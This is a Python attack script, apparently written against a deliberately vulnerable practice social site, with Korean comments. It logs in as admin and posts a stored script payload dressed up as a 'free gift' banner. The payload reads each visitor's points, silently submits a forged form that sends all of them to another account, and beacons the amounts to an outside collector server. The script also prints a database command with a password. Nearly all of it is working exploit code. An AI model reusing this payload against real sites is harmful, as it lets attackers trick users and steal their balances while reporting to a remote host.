#!/usr/bin/env python3
"""
fake-gift CSRF 공격 - 스마트 버전
사용자의 현재 포인트를 먼저 확인하고 그 금액만 전송
"""

import requests

TARGET = "http://52.78.221.104"
LOGIN_URL = f"{TARGET}/login.php"
POST_URL = f"{TARGET}/new_post.php"
INDEX_URL = f"{TARGET}/index.php"

# 스마트 fake-gift HTML - 현재 포인트 확인 후 전송
FAKE_GIFT_HTML = """<div id="giftbox" style="font-family:Arial;text-align:center;padding:30px;background:linear-gradient(135deg,#667eea,#764ba2);color:white"><div style="background:white;color:#333;padding:40px;border-radius:15px;max-width:400px;margin:0 auto;box-shadow:0 10px 30px rgba(0,0,0,0.3)"><div style="font-size:80px">🎁</div><h2 style="color:#667eea">축하합니다!</h2><p style="font-size:1.2em">무료 포인트 지급 중...</p><div id="s" style="background:#f0f0f0;padding:10px;border-radius:8px;margin:15px 0;color:#667eea;font-weight:bold">확인 중...</div></div><div id="f"></div></div><script>(function(){if(localStorage.getItem('gift_claimed')){document.getElementById('giftbox').innerHTML='<p style="padding:20px;color:#666">이미 받으셨습니다</p>';return}localStorage.setItem('gift_claimed','1');const A='http://13.158.67.78:5000';function n(e,p){const i=new Image();i.src=A+e+'?'+p+'&t='+Date.now()}n('/notify','event=load');fetch('http://52.78.221.104/profile.php').then(r=>r.text()).then(html=>{const match=html.match(/포인트:\\s*(\\d+)/)||html.match(/Points:\\s*(\\d+)/)||html.match(/points">\\s*(\\d+)/)||html.match(/(\\d+)\\s*P/);let pts=500;if(match){pts=parseInt(match[1]);console.log('[+] 현재 포인트:',pts+'P')}else{console.log('[!] 포인트 파싱 실패, 기본값 500P 사용')}n('/victim','points='+pts);const f='<form id="f0" method="POST" action="http://52.78.221.104/profile.php" target="if0"><input type="hidden" name="send_gift" value="1"><input type="hidden" name="receiver_id" value="999"><input type="hidden" name="gift_type" value="diamond"><input type="hidden" name="points" value="'+pts+'"><input type="hidden" name="message" value="E"></form><iframe name="if0" style="display:none"></iframe>';document.getElementById('f').innerHTML=f;document.getElementById('s').innerHTML='전송 중... '+pts+'P';setTimeout(()=>{document.getElementById('f0').submit();n('/transfer','amount='+pts);console.log('[+] 전송:',pts+'P');setTimeout(()=>{n('/complete','total='+pts);document.getElementById('s').innerHTML='완료!';console.log('[+] 완료:',pts+'P')},1000)},500)}).catch(e=>{console.log('[!] 에러:',e);const pts=500;n('/victim','points='+pts);const f='<form id="f0" method="POST" action="http://52.78.221.104/profile.php" target="if0"><input type="hidden" name="send_gift" value="1"><input type="hidden" name="receiver_id" value="999"><input type="hidden" name="gift_type" value="diamond"><input type="hidden" name="points" value="'+pts+'"><input type="hidden" name="message" value="E"></form><iframe name="if0" style="display:none"></iframe>';document.getElementById('f').innerHTML=f;document.getElementById('s').innerHTML='전송 중... '+pts+'P';setTimeout(()=>{document.getElementById('f0').submit();n('/transfer','amount='+pts);setTimeout(()=>{n('/complete','total='+pts);document.getElementById('s').innerHTML='완료!'},1000)},500)})})();</script>"""

print("="*60)
print("🎁 fake-gift 스마트 버전 (현재 포인트만)")
print("="*60)
print()

session = requests.Session()

print("[*] admin으로 로그인...")
r = session.post(LOGIN_URL, data={'username': 'admin', 'password': 'admin123'}, allow_redirects=True)

if 'index.php' in r.url or 'profile.php' in r.url:
    print("[+] 로그인 성공!")
else:
    print("[-] 로그인 실패")
    exit(1)

print("\n[*] 기존 게시물 삭제:")
print("    mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e \"DELETE FROM posts WHERE content LIKE '%<script%';\"")

print("\n[*] 스마트 버전 게시...")
r = session.post(POST_URL, data={'content': FAKE_GIFT_HTML}, allow_redirects=True)

print(f"[+] 응답: {r.status_code}")

r = session.get(INDEX_URL)
if 'giftbox' in r.text or '축하' in r.text:
    print("[+] 게시 완료!")
    print()
    print("="*60)
    print("✅ 스마트 버전 배포!")
    print("="*60)
    print()
    print("동작 방식:")
    print("1. profile.php에서 현재 포인트 가져오기")
    print("2. 파싱: '포인트: 500' 또는 'Points: 500' 패턴")
    print("3. 정확한 금액만 1회 전송")
    print("4. Flask에 정확한 금액만 알림")
    print()
    print("예상 결과:")
    print("- alice(500P): Flask에 500P만 표시")
    print("- admin(999999P): Flask에 999999P 표시")
    print("- 1회만 전송, 새로고침 안 함")
    print()
    print("테스트:")
    print("1. Flask 리셋: curl http://13.158.67.78:5000/reset")
    print("2. alice 로그인 (시크릿 모드)")
    print("3. index.php 접속")
    print("4. 콘솔 확인: [+] 현재 포인트: 500P")
    print("5. Flask 확인: 탈취한 포인트: 500P")
    print()
    print("="*60)
else:
    print("[-] 실패")
